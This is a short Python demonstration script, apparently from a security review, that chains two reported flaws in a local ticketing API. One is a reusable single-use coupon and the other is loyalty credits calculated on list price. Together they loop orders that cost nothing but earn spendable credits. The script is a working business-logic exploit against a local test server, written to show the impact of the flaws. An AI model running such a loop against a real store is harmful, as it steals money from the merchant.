"""Two findings the AI reported separately, joined by a human.

Finding A (TC-012): the single-use SPEAKER100 coupon can be redeemed twice.
                    The model rated this "high" and moved on.
Finding B (nobody):  loyalty credits are 10% of the LIST price, not of the
                    amount actually paid.

Neither is exploitable alone. Together: pay nothing, earn 10% of list price,
repeat. Credits are spendable, so this is money.

    python demo/money_loop.py
"""

import httpx

BASE = "http://127.0.0.1:8000"
ROUNDS = 5   # 5 x 9 tickets = 45, inside GENERAL-2026's stock of 50


def main() -> None:
    with httpx.Client(timeout=30.0) as c:
        c.post(f"{BASE}/_reset")
        tok = c.post(f"{BASE}/auth/login",
                     json={"email": "alice@corp.example", "password": "alice123"}
                     ).json()["access_token"]
        h = {"Authorization": f"Bearer {tok}"}

        start = c.get(f"{BASE}/me", headers=h).json()["credits"]
        print(f"starting balance: {start:,.2f}\n")
        print(f"{'round':>5}  {'paid':>8}  {'earned':>8}  {'balance':>12}")
        print("-" * 40)

        for i in range(1, ROUNDS + 1):
            r = c.post(f"{BASE}/orders",
                       json={"ticket_id": 1, "quantity": 9, "coupon": "SPEAKER100"},
                       headers=h).json()
            if "total_charged" not in r:
                print(f"{i:>5}  stopped: {r}")
                break
            print(f"{i:>5}  {r['total_charged']:>8,.2f}  "
                  f"{r['credits_earned']:>8,.2f}  {r['credit_balance']:>12,.2f}")

        end = c.get(f"{BASE}/me", headers=h).json()["credits"]

    print("-" * 40)
    print(f"\n{ROUNDS} orders. Nothing paid. Balance up {end - start:,.2f}.")
    print("Every individual request returned 201. Nothing was invalid.")


if __name__ == "__main__":
    main()
